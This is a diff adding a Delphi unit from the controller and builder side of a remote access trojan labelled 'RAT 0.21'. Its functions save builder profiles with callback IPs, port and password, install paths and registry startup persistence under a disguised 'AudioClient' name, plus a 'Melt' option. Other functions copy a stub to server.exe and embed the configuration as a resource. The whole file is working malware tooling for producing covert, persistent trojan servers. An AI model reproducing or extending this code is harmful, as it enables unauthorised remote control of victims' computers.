@@ -1,0 +1,613 @@
+unit uFunctions;
+interface
+uses ComCtrls, windows, SysUtils, Classes,
+     uVNC, Graphics, Messages, winsock,
+     INIFiles, uWebcam, uControl;
+const
+  _RATVER = '0.21';
+  MSG_CONNLIST = WM_USER + 1;
+  MSG_ADDLOG = MSG_CONNLIST + 1;
+  MSG_COUNTCONNECTION = MSG_ADDLOG + 1;
+type
+  TSocketInfo = class
+    lvItem:TListItem;
+    fControl:TForm10;
+    lSocketID,lTransferID:Integer;
+    sRemotePath, sLocalPath:String;
+  end;
+
+  TTransferInfo = packed record
+    lFileSize:Cardinal;
+    lReceivedSize:Cardinal;
+    lStarted:Cardinal;
+    lSocketID:Integer;
+    lDownloadID:Integer;
+    thrID:Pointer;
+    sFilename:String;
+  end;
+
+  LPSocketHeader = ^TCustomPacketHeader;
+  TCustomPacketHeader = packed record
+    bFlag:Byte;
+    dwPackLen:DWORD;
+    bPackType:Byte;
+  end;
+
+  PBuilderInfo = ^TBuilderInfo;
+  TBuilderInfo = packed record
+    dwPort:DWORD;
+    strPassword:String[10];
+    strID:String[20];
+    bInstall:Boolean;
+    bStartup:Boolean;
+    strFilename:String[10];
+    dwDir:DWORD;
+    bHKCU:Boolean;
+    bHKLM:Boolean;
+    bActiveX:Boolean;
+    strHKCUStartup:String[25];
+    strHKLMStartup:String[25];
+    strActiveXStartup:String[25];
+    bPersistance:Boolean;
+    bMelt:Boolean;
+    dwIPsLen:DWORD;
+    strIPs:Byte;
+  end;
+  
+  TByteArray = array of Byte;
+
+function IsNumeric(sVal: string): boolean;
+function RC4(Expression, Password:string):string;
+procedure CountConnections;
+function GetDriveIcon(sString:String):Integer;
+function GetByteSize(sBytes: String): string;
+function GetUserFolder(sUser:String):String;
+function GetPercent(c1,c2:Cardinal):String;
+Function RemoteAddress(Sock: Integer): String;
+function TestIP(sIP:String;iPort:Integer):Boolean;
+procedure LoadProfile(sUser:String);
+function AddNewProfile(sUser:String):Boolean;
+procedure ListProfiles;
+procedure DeleteProfile(sUser:String);
+procedure SaveProfile(sUser:String);
+function CheckInputs:Boolean;
+function CollectItems(cLv:TListView):String;
+function GetRadioButton:Integer;
+function PrepareStub:Boolean;
+function WriteResource(pData:Pointer;lpLen:Cardinal):Boolean;
+procedure AddBFailLog(sString:String);
+procedure AddBOKLog(sString:String);
+function GetUsersFolder:String;
+
+implementation
+
+uses uMain, uClients;
+
+Function ResolveIP(HostName: String): String;
+Type
+  tAddr = Array[0..100] Of PInAddr;
+  pAddr = ^tAddr;
+Var
+  I             :Integer;
+  PHE           :PHostEnt;
+  P             :pAddr;
+Begin
+  Result := '';
+  Try
+    PHE := GetHostByName(pChar(HostName));
+    If (PHE <> NIL) Then
+    Begin
+      P := pAddr(PHE^.h_addr_list);
+      I := 0;
+      While (P^[I] <> NIL) Do
+      Begin
+        Result := (inet_nToa(P^[I]^));
+        Inc(I);
+      End;
+    End;
+  Except
+  End;
+End;
+
+function TestIP(sIP:String;iPort:Integer):Boolean;
+var
+  Addr:TSockAddrIn;
+  lSocket:Integer;
+begin
+  Result := False;
+  sIP := ResolveIP(sIP);
+  lSocket := Socket(AF_INET, SOCK_STREAM, 0);
+  Addr.sin_family := AF_INET;
+  Addr.sin_port := hTons(iPort);
+  Addr.sin_addr.S_addr := inet_Addr(pChar(sIP));
+  If (Connect(lSocket, Addr, SizeOf(Addr)) = 0) Then
+    Result := True;
+  closesocket(lSocket);
+end;
+
+function GetByteSize(sBytes: String): string;
+const
+  B = 1;
+  KB = 1024 * B;
+  MB = 1024 * KB;
+  GB = 1024 * MB;
+var
+  lBytes:Longint;
+begin
+  try
+    lBytes := StrToInt(sBytes);
+  except
+    lBytes := 0;
+  end;
+  if lBytes > GB then
+    result := FormatFloat('#.## GB', lBytes / GB)
+  else if lBytes > MB then
+    result := FormatFloat('#.## MB', lBytes / MB)
+  else if lBytes > KB then
+    result := FormatFloat('#.## KB', lBytes / KB)
+  else
+    result := FormatFloat('#.## bytes', lBytes);
+end;
+function GetDriveIcon(sString:String):Integer;
+begin
+  if sString = '1' then 
+    Result := 3
+  else if sString = '2' then
+    Result := 6
+  else if sString = '3' then
+    Result := 5
+  else if sString = '4' then
+    Result := 4
+  else
+    Result := 3;
+end;
+procedure Move(Destination, Source: Pointer; dLength:Cardinal);
+begin
+  CopyMemory(Destination, Source, dLength);
+end;
+
+function RC4(Expression, Password:string):string;
+var
+  RB:         array[0..255] of integer;
+  X, Y, Z:    LongInt;
+  Key:        TByteArray;
+  ByteArray:  TByteArray;
+  Temp:       Byte;
+begin
+  if Length(Password) = 0 then
+    Exit;
+  if Length(Expression) = 0 then
+    Exit;
+  if Length(Password) > 256 then
+  begin
+    SetLength(Key, 256);
+    Move(@Key[0], @Password[1], 256)
+  end
+  else
+  begin
+    SetLength(Key, Length(Password));
+    Move(@Key[0], @Password[1], Length(Password));
+  end;
+  for X := 0 to 255 do
+    RB[X] := X;
+  X := 0;
+  Y := 0;
+  Z := 0;
+  for X := 0 to 255 do
+  begin
+    Y := (Y + RB[X] + Key[X mod Length(Password)]) mod 256;
+    Temp := RB[X];
+    RB[X] := RB[Y];
+    RB[Y] := Temp;
+  end;
+  X := 0;
+  Y := 0;
+  Z := 0;
+  SetLength(ByteArray, Length(Expression));
+  Move(@ByteArray[0], @Expression[1], Length(Expression));
+  for X := 0 to Length(Expression) - 1 do
+  begin
+    Y := (Y + 1) mod 256;
+    Z := (Z + RB[Y]) mod 256;
+    Temp := RB[Y];
+    RB[Y] := RB[Z];
+    RB[Z] := Temp;
+    ByteArray[X] := ByteArray[X] xor (RB[(RB[Y] + RB[Z]) mod 256]);
+  end;
+  SetLength(Result, Length(Expression));
+  Move(@Result[1], @ByteArray[0], Length(Expression));
+end;
+
+function IsNumeric(sVal: string): boolean;
+var
+  iDummy: integer;
+begin
+  Result := True;
+  try
+    iDummy := StrToInt(sVal);
+  except
+    Result := False;
+  end;
+end;
+
+function GetProfileFolder:String;
+var
+  sCurrentPath:String;
+begin
+  sCurrentPath := GetCurrentDir;
+  if sCurrentPath[Length(sCurrentPath)] <> '\' then
+    sCurrentPath := sCurrentPath + '\';
+  Result := sCurrentPath + 'Profiles\';
+  If (Not DirectoryExists(Result)) Then
+    CreateDirectory(pChar(Result), NIL);
+end;
+
+function GetUsersFolder:String;
+var
+  sCurrentPath:String;
+begin
+  sCurrentPath := GetCurrentDir;
+  if sCurrentPath[Length(sCurrentPath)] <> '\' then
+    sCurrentPath := sCurrentPath + '\';
+  Result := sCurrentPath + 'Users\';
+  If (Not DirectoryExists(Result)) Then
+    CreateDirectory(pChar(Result), NIL);
+end;
+
+function GetUserFolder(sUser:String):String;
+var
+  sCurrentPath:String;
+begin
+  sCurrentPath := GetCurrentDir;
+  if sCurrentPath[Length(sCurrentPath)] <> '\' then sCurrentPath := sCurrentPath + '\';
+  Result := sCurrentPath + 'Users\' + sUser + '\';
+  If (Not DirectoryExists(Result)) then CreateDirectory(pChar(Result), NIL);
+end;
+
+procedure CountConnections;
+begin
+  Form1.Caption := 'RAT ' + _RATVER + ' - Connections: ' + Inttostr(Form1.lvConnections.Items.Count);
+end;
+
+function GetPercent(c1,c2:Cardinal):String;
+var
+  ePercent:Extended;
+begin
+  ePercent := c1 / c2;
+  if trunc(ePercent * 100) <= 100 then
+    Result := IntToStr(trunc(ePercent * 100)) + ' %'
+  else
+    Result := '100 %';
+end;
+
+Function RemoteAddr(Sock: TSocket): TSockAddrIn;
+Var
+  W     :TWSAData;
+  S     :TSockAddrIn;
+  I     :Integer;
+Begin
+  WSAStartUP($0202, W);
+  I := SizeOf(S);
+  GetPeerName(Sock, S, I);
+  WSACleanUP();
+  Result := S;
+End;
+
+Function RemoteAddress(Sock: Integer): String;
+Begin
+  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
+End;
+
+function CollectItems(cLv:TListView):String;
+var
+  i:integer;
+begin
+  Result := '';
+  if cLv.Items.Count < 1 then exit;
+  for i := 0 to cLv.Items.Count - 1 do begin
+    Result := Result + cLv.Items.Item[i].Caption + '#';
+  end;
+end;
+
+procedure SaveProfile(sUser:String);
+var
+  mFile:TIniFile;
+  strFullPath:String;
+begin
+  strFullPath := GetProfileFolder + sUser;
+  try
+    mFile := TIniFile.Create(strFullPath);
+    mFile.WriteInteger('Connection','Port',StrToInt(Form1.edtBPort.Text));
+    mFile.WriteString('Connection','ID',Form1.edtBID.Text);
+    mFile.WriteString('Connection','Password',Form1.edtBPassword.Text);
+    mFile.WriteBool('Installation','Install', Form1.chkBInstall.Checked);
+    mFile.WriteBool('Installation','Startup', Form1.chkBStartup.Checked);
+    mFile.WriteBool('Installation','HKCU', Form1.chkBHKCU.Checked);
+    //mFile.WriteBool('Installation','HKLM', Form1.chkBHKLM.Checked);
+    //mFile.WriteBool('Installation','ActiveX', Form1.chkBActiveX.Checked);
+    mFile.WriteString('Installation','Filename',Form1.edtBFilename.Text);
+    mFile.WriteString('Installation','HKCUName',Form1.edtBHKCU.Text);
+    //mFile.WriteString('Installation','HKLMName',Form1.edtBHKLM.Text);
+    //mFile.WriteString('Installation','ActiveXName',Form1.edtBActiveX.Text);
+    mFile.WriteString('Connection','IPs',CollectItems(Form1.lvBIPs));
+    //mFile.WriteBool('Additional','Persistance',False);
+    mFile.WriteBool('Additional','Melt',Form1.chkBMelt.checked);
+    mFile.WriteInteger('Connection','Directory',GetRadioButton);
+  finally
+    mFile.Free;
+  end;
+end;
+
+procedure ListIPs(sString:String);
+var
+  strList:TStringList;
+  i:Integer;
+  lstIP:TListItem;
+begin
+  Form1.lvBIPs.Clear;
+  if sString = '' then exit;
+  strList := Explode('#',sString);
+  if strList.Count > 0 then begin
+    for i := 0 to strList.Count - 1 do begin
+      if strList[i] <> '' then begin
+        lstIP := Form1.lvBIPs.Items.Add;
+        lstIP.caption := strList[i];
+        lstIP.SubItems.Add('Not tested!'); 
+      end;
+    end;
+  end;
+end;
+
+procedure LoadProfile(sUser:String);
+var
+  mFile:TIniFile;
+  strFullPath:String;
+  iRadioButton:Integer;
+begin
+  strFullPath := GetProfileFolder + sUser;
+  Form1.pgc2.TabIndex := 0;
+  try
+    mFile := TIniFile.Create(strFullPath);
+    Form1.edtBID.Text := mFile.ReadString('Connection','ID','New User');
+    Form1.edtBPort.Text := InttoStr(mFile.ReadInteger('Connection','Port',1515));
+    Form1.edtBPassword.Text := mFile.ReadString('Connection','Password','pass');
+    Form1.chkBInstall.Checked := mFile.ReadBool('Installation','Install', True);
+    Form1.chkBStartup.Checked := mFile.ReadBool('Installation','Startup', True);
+    Form1.chkBHKCU.Checked := mFile.ReadBool('Installation','HKCU', True);
+    Form1.chkBHKLM.Checked := mFile.ReadBool('Installation','HKLM', True);
+    Form1.chkBActiveX.Checked := mFile.ReadBool('Installation','ActiveX', True);
+    Form1.edtBFilename.Text := mFile.ReadString('Installation','Filename','server.exe');
+    Form1.edtBHKCU.Text := mFile.ReadString('Installation','HKCUName','AudioClient');
+    Form1.edtBHKLM.Text := mFile.ReadString('Installation','HKLMName','server.exe');
+    Form1.edtBActiveX.Text := mFile.ReadString('Installation','ActiveXName','server.exe');
+    //Form1.chkBPersistance.Checked := mFile.ReadBool('Additional','Persistance',False);
+    Form1.chkBMelt.Checked := mFile.ReadBool('Additional','Melt',False);
+    //Form1.chkBUAC.Checked := mFile.ReadBool('Additional','UAC',False);
+    ListIPs(mFile.ReadString('Connection','IPs',''));
+    iRadioButton := mFile.ReadInteger('Installation','Directory',1);
+    case iRadioButton of
+      1: Form1.rbBAppData.Checked := True;
+      2: Form1.rbBWindows.Checked := True;
+      //else
+        //Form1.rbBAppData.Checked := True;
+    end;
+  finally
+    mFile.Free;
+  end;
+end;
+
+procedure AddBOKLog(sString:String);
+begin
+  with Form1.redtBuild do begin
+    SelStart := GetTextLen;
+    SelAttributes.Color := clGreen;
+    SelText := '[' + DateToStr(Date) + ' ' + TimeToStr(Time) + '] ' + sString + #13#10;
+  end;
+end;
+
+procedure AddBFailLog(sString:String);
+begin
+  with Form1.redtBuild do begin
+    SelStart := GetTextLen;
+    SelAttributes.Style := [fsBold];
+    SelAttributes.Color := clRed;
+    SelText := '[' + DateToStr(Date) + ' ' + TimeToStr(Time) + '] ' + sString + #13#10;
+  end;
+end;
+
+function CheckInputs:Boolean;
+begin
+  Form1.redtBuild.Clear;
+  if IsNumeric(Form1.edtBPort.Text) then
+    AddBOKLog('Port is ok!')
+  else begin
+    AddBFailLog('Port is invalid!');
+    Result := False;
+    Exit;
+  end;
+
+  if Length(Form1.edtBPassword.Text) <= 10 then
+    AddBOKLog('Password is ok!')
+  else begin
+    AddBFailLog('Password is too long!');
+    Result := False;
+    Exit;
+  end;
+
+  if (Length(Form1.edtBID.Text) = 0) then begin
+    AddBFailLog('ID is invalid!');
+    Result := False;
+    Exit;
+  end;
+
+  if Length(Form1.edtBID.Text) <= 20 then
+    AddBOKLog('ID is ok!')
+  else begin
+    AddBFailLog('ID is too long!');
+    Result := False;
+    Exit;
+  end;
+
+  if Form1.lvBIPs.Items.Count <> 0 then
+    AddBOKLog('IP''s ok!')
+  else begin
+    AddBFailLog('Add at least 1 IP to the List!');
+    Result := False;
+    Exit;
+  end;
+
+  if Form1.chkBInstall.Checked then begin
+    if (Length(Form1.edtBFilename.Text) = 0) then begin
+      AddBFailLog('Filename is invalid!');
+      Result := False;
+      Exit;
+    end;
+    if (Length(Form1.edtBFilename.Text) > 10) then begin
+      AddBFailLog('Filename is too long!');
+      Result := False;
+      Exit;
+    end;
+    if (Copy(Uppercase(Form1.edtBFilename.Text),Length(Form1.edtBFilename.Text) - 3,4) <> '.EXE') then begin
+      AddBFailLog('Filename must have an Exe extension!');
+      Result := False;
+      Exit;
+    end;
+    AddBOKLog('Filename is ok!');
+  end;
+  
+  if Form1.chkBStartup.Checked then begin
+    if Form1.chkBHKCU.Checked then begin
+      if (Length(Form1.edtBHKCU.Text) = 0) then begin
+        AddBFailLog('HKCU Startup is invalid!');
+        Result := False;
+        Exit;
+      end;
+      if (Length(Form1.edtBHKCU.Text) > 25) then begin
+        AddBFailLog('HKCU Startup is too long!');
+        Result := False;
+        Exit;
+      end;
+      AddBOKLog('HKCU Startup is ok!');
+    end;
+    if Form1.chkBHKLM.Checked then begin
+      if (Length(Form1.edtBHKLM.Text) = 0) then begin
+        AddBFailLog('HKLM Startup is invalid!');
+        Result := False;
+        Exit;
+      end;
+      if (Length(Form1.edtBHKLM.Text) > 25) then begin
+        AddBFailLog('HKLM Startup is too long!');
+        Result := False;
+        Exit;
+      end;
+      AddBOKLog('HKLM Startup is ok!');
+    end;
+    if Form1.chkBActiveX.Checked then begin
+      if (Length(Form1.edtBActiveX.Text) = 0) then begin
+        AddBFailLog('ActiveX Startup is invalid!');
+        Result := False;
+        Exit;
+      end;
+      if (Length(Form1.edtBActiveX.Text) > 25) then begin
+        AddBFailLog('ActiveX Startup is too long!');
+        Result := False;
+        Exit;
+      end;
+      AddBOKLog('ActiveX Startup is ok!');
+    end;
+  end;
+end;
+
+function AddNewProfile(sUser:String):Boolean;
+var
+  mFile:TIniFile;
+  strFullPath:String;
+begin
+  strFullPath := GetProfileFolder + sUser;
+  if FileExists(strFullPath) = False then begin
+    try
+      mFile := TIniFile.Create(strFullPath);
+      mFile.WriteInteger('Connection','Port',1515);
+      mFile.WriteString('Connection','Password','pass');
+      mFile.WriteBool('Installation','Install', False);
+      mFile.WriteBool('Installation','Startup', False);
+      mFile.WriteBool('Installation','HKCU', False);
+      //mFile.WriteBool('Installation','HKLM', False);
+      //mFile.WriteBool('Installation','ActiveX', False);
+      mFile.WriteString('Installation','Filename','server.exe');
+      mFile.WriteString('Installation','HKCUName','AudioClient');
+      //mFile.WriteString('Installation','HKLMName','server.exe');
+      //mFile.WriteString('Installation','ActiveXName','server.exe');
+      mFile.WriteInteger('Connection','Directory',1);
+      mFile.WriteString('Connection','IPs','');
+      //mFile.WriteBool('Additional','Persistance',False);
+      mFile.WriteBool('Additional','Melt',False);
+      //mFile.WriteBool('Additional','UAC',False);
+    finally
+      mFile.Free;
+    end;
+    Result := True;
+  end else
+    Result := False;
+end;
+
+procedure DeleteProfile(sUser:String);
+begin
+  DeleteFile(GetProfileFolder + sUser);
+end;
+
+procedure ListProfiles;
+var
+  SR: TSearchRec;
+  lvItem:TListItem;
+begin
+  Form1.lvProfiles.Clear;
+  if FindFirst(GetProfileFolder + '*.*', faAnyFile, SR) = 0 then begin
+    repeat
+      if ((SR.Attr And faDirectory) <> faDirectory) then begin
+        lvItem := Form1.lvProfiles.Items.Add;
+        lvItem.Caption := SR.Name;
+      end;
+    until FindNext(SR) <> 0;
+    FindClose(SR);
+  end;
+end;
+
+function GetRadioButton:Integer;
+begin
+  if Form1.rbBAppData.Checked then
+    Result := 1
+  else if Form1.rbBWindows.Checked then
+    Result := 2
+  else
+    Result := 3;
+end;
+
+function PrepareStub:Boolean;
+var
+  serverPath:String;
+begin
+  serverPath := GetCurrentDir + '\server.exe';
+  Result := False;
+  if FileExists(serverPath) then
+    if DeleteFile(serverPath) = false then
+      exit;
+  if CopyFile(Pchar(GetCurrentDir + '\stub\stub.exe'),PChar(serverPath), False) then
+    Result := True;
+end;
+
+function WriteResource(pData:Pointer;lpLen:Cardinal):Boolean;
+var
+  hResource: Cardinal;
+begin
+  Result := False;
+  hResource := BeginUpdateResource(Pchar(GetCurrentDir + '\server.exe'), False);
+  if hResource <> 0 then
+  begin
+    if UpdateResource(hResource, RT_RCDATA, 'CFG', 0, pData, lpLen) then
+      Result := True;
+    EndUpdateResource(hResource, False);
+  end;
+end;
+
+end.
